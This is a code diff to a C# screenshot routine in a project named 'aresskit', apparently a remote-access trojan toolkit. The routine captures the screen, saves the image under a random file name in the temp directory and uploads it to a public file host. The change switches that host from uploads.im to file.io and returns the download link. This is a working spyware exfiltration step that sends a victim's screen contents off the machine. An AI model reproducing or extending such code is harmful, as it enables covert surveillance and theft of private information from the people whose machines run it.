@@ -1,6 +1,17 @@
 ﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.ComponentModel;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.Globalization;
+using System.IO;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace aresskit
@@ -15,11 +26,11 @@ namespace aresskit
             imagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
             myImage.Save(imagePath, ImageFormat.Png);
 
-            // Upload file
-            //FileHandler.uploadFile(imagePath, "http://uploads.im/api?upload")
-            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(imagePath, "http://uploads.im/api?upload"));
-            return json.data.img_url;
+            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(imagePath, "https://file.io/?expires=1w"));
+            return json.link;
         }
+
+
 
         private static Bitmap Capture(int x, int y, int width, int height)
         {
@@ -34,3 +45,4 @@ namespace aresskit
         }
     }
 }
+
